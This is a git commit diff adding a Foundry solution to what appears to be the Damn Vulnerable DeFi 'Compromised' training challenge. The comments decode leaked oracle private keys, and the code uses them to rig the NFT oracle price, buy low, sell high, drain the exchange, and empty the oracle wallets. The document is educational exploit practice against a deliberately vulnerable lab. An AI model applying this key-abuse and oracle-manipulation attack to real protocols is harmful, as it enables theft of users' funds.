2acc99cf048c4e7f0043054b00f3cdde55f847ab
Matias Anaya <matiasanaya@gmail.com>
2024-09-06 15:50:25 -0300

    solve: compromised

--- test/compromised/Compromised.t.sol
+++ test/compromised/Compromised.t.sol
@@ -20,7 +20,6 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
@@ -75,7 +74,65 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // leaks are base64 encoded private keys for oracles
+        // const { ethers } = require("ethers");
+        // const decode = function (leak) {
+        //     const base64 = Buffer.from(leak.split(` `).join(``), `hex`).toString(`utf8`);
+        //     const pk = Buffer.from(base64, `base64`).toString(`utf8`);
+        //     const wallet = new ethers.Wallet(pk);
+        //     return [pk, wallet.address];
+        // }
+        // [
+        //     "4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30",
+        //     "4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35"
+        // ].map( leak => decode(leak) );
+        // [
+        //     [
+        //         '0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744',
+        //         '0x188Ea627E3531Db590e6f1D71ED83628d1933088'
+        //     ],
+        //     [
+        //         '0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159',
+        //         '0xA417D473c40a4d42BAd35f147c21eEa7973539D8'
+        //     ]
+        // ]
+
+        uint256[2] memory leaked = [
+            uint256(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744),
+            uint256(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159)
+        ];
+
+        for (uint256 i = 0; i < leaked.length; i++) {
+            vm.broadcast(leaked[i]);
+            oracle.postPrice("DVNFT", 0);
+        }
+
+        vm.prank(player);
+        uint256 id = exchange.buyOne{value: 1}();
+
+        for (uint256 i = 0; i < leaked.length; i++) {
+            vm.broadcast(leaked[i]);
+            oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        }
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        (bool recovered,) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        require(recovered, "failed to send Ether");
+        vm.stopPrank();
+
+        for (uint256 i = 0; i < leaked.length; i++) {
+            vm.broadcast(leaked[i]);
+            (bool extra,) = player.call{value: TRUSTED_SOURCE_INITIAL_ETH_BALANCE}("");
+            require(extra, "failed to send Ether");
+        }
+
+        assertEq(address(exchange).balance, 0);
+        assertEq(address(sources[0]).balance, 0);
+        assertEq(address(sources[1]).balance, 0);
+        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);
+        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE + TRUSTED_SOURCE_INITIAL_ETH_BALANCE * 2);
     }
 
     /**
